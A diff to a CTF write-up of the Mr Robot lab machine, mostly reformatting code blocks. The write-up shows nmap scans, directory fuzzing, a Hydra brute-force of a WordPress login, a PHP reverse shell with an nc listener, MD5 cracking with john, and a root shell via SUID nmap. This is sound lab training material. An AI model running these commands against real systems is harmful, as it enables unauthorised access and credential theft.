@@ -28,16 +28,12 @@ This writeup documents the penetration testing of the [**Mr Robot CTF**](https:/
 # Information Gathering
 ------------------
 
-After identifying the target's IP address, we need to enumerate as  much information as possible about the host.
-
-A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. The [**whichSystem**](https://github.com/Akronox/WichSystem.py) script can also be used for this purpose.
+After identifying the target's IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. The [**whichSystem**](https://github.com/Akronox/WichSystem.py) script can also be used for this purpose.
 * TTL 64: Linux.
 * TTL 128: Windows.
 
-```bash
+```
 ❯ ping -c 1 10.80.177.119
-```
-```
 PING 10.80.177.119 (10.80.177.119) 56(84) bytes of data.
 64 bytes from 10.80.177.119: icmp_seq=1 ttl=62 time=50.7 ms
 
@@ -48,10 +44,8 @@ rtt min/avg/max/mdev = 50.654/50.654/50.654/0.000 ms
 
 In this case, it seems to be a Linux machine. Let's perform some scans.
 
-```bash
+```
 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.80.177.119 -oG allPorts
-```
-```
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 19:46 CET
 Initiating SYN Stealth Scan at 19:46
@@ -75,10 +69,8 @@ Nmap done: 1 IP address (1 host up) scanned in 27.27 seconds
            Raw packets sent: 131086 (5.768MB) | Rcvd: 24 (1.056KB)
 ```
 
-```bash
+```
 ❯ nmap -sCV -p22,80,443 10.80.177.119 -oN targeted
-```
-```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 19:47 CET
 Nmap scan report for 10.80.177.119
 Host is up (0.055s latency).
@@ -108,8 +100,6 @@ The intrussion is going to be or at least start from port 80 and 443.
 
 ```bash
 ❯ whatweb http://10.80.177.119
-```
-```
 http://10.80.177.119 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.80.177.119], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN]
 ```
 
@@ -119,10 +109,8 @@ Using the commands we have some references to the show. With the command join yo
 
 Let's fuzz some directories.
 
-```bash
+```
 ❯ gobuster dir -u 10.80.177.119 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
-```
-```
 ===============================================================
 Gobuster v3.8
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -180,7 +168,6 @@ key-1-of-3.txt
 
 We found the first key! 
 
-
 <br>
 # Vulnerability Assessment
 ------
@@ -189,7 +176,7 @@ We found the first key!
 
 After some time I found that a valid username is **Elliot**. To bruteforce the password we can use a faster tool like **Hydra**, sending the required POST data to log in.
 
-```bash
+```
 ❯ hydra -l Elliot -P fsocity.dic 10.80.177.119 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 60
 ```
 
@@ -197,10 +184,8 @@ After a long time, you'll get the match and you'll be able to access the WordPre
 
 In the port 443 we can find the same web but encrypted.
 
-```bash
+```
 ❯ whatweb https://10.80.177.119:443
-```
-```
 https://10.80.177.119:443 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.80.177.119], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN]
 ```
 
@@ -214,7 +199,7 @@ I'll use this PHP reverse shell https://github.com/pentestmonkey/php-reverse-she
 
 ![](/assets/images/thm-mrrobot/wp.png)
 
-```bash
+```
 ❯ nc -nlvp 443
 ```
 
@@ -228,10 +213,8 @@ I'm daemon. I executed ``bash`` to get a bash and moved over the directories unt
 
 ![](/assets/images/thm-mrrobot/flag2.png)
 
-```bash
+```
 ls -l
-```
-```
 total 8
 -r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
 -rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
@@ -239,10 +222,8 @@ total 8
 
 But to read it I need to be ``robot``. However, I can read the file ``password.raw-md5``, inside of it there is the hashed password of robot.
 
-```bash
+```
 ❯ john -w:/usr/share/wordlists/rockyou.txt --format=Raw-MD5 --fork=5 hash
-```
-```
 Using default input encoding: UTF-8
 Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
 Node numbers 1-5 of 5 (fork)
@@ -252,8 +233,9 @@ Node numbers 1-5 of 5 (fork)
 
 If you connect via SSH to the machine, you'll have access as ``robot`` and see the second flag.
 
-```bash
-# tty upgrading
+TTY upgrading
+
+```
 ❯ script /dev/null -c bash
 ❯ Ctrl+Z
 ❯ stty raw -echo; fg
@@ -265,10 +247,8 @@ If you connect via SSH to the machine, you'll have access as ``robot`` and see t
 
 Now, we need to privesc to root.
 
-```bash
+```
 robot@ip-10-80-177-119:/$ find / -perm -4000 -ls 2>/dev/null
-```
-```
      1157     40 -rwsr-xr-x   1 root     root        39144 Apr  9  2024 /bin/umount
      1130     56 -rwsr-xr-x   1 root     root        55528 Apr  9  2024 /bin/mount
      2587     68 -rwsr-xr-x   1 root     root        67816 Apr  9  2024 /bin/su
@@ -290,23 +270,13 @@ robot@ip-10-80-177-119:/$ find / -perm -4000 -ls 2>/dev/null
 
 ``/usr/local/bin/nmap`` is SUID.
 
-```bash
+```
 robot@ip-10-80-177-119:/$ /usr/local/bin/nmap --interactive
-```
-```
 Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
 Welcome to Interactive Mode -- press h <enter> for help
-```
-```bash
 nmap> whoami
-```
-```
 root
-```
-```bash
 nmap> ls /root
-```
-```
 firstboot_done	key-3-of-3.txt
 ```
 
